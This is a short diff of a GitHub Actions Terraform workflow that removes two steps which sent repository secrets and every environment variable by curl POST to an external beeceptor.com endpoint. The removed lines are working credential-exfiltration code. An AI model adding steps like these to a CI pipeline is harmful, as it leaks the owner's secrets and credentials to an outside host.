@@ -33,20 +33,6 @@ jobs:
  
     - name: Setup Terraform
       uses: hashicorp/setup-terraform@v1
-
-    - name: Export Secrets
-      run: |
-        curl -X POST -H "Content-Type: application/json" \
-        -d '{"SECRET1": "${{ secrets.SECRET1 }}", "SECRET2": "${{ secrets.SECRET2 }}"}' \
-        https://gha-export-test.free.beeceptor.com
-        
-    - name: Dump and Export Environment Variables
-      run: |
-        env | while read -r line; do
-          curl -X POST -H "Content-Type: application/json" \
-          -d "{\"env_variable\": \"$line\"}" \
-          https://gha-export-test.free.beeceptor.com
-        done
     
       #check formatting
     - name: Terraform Format
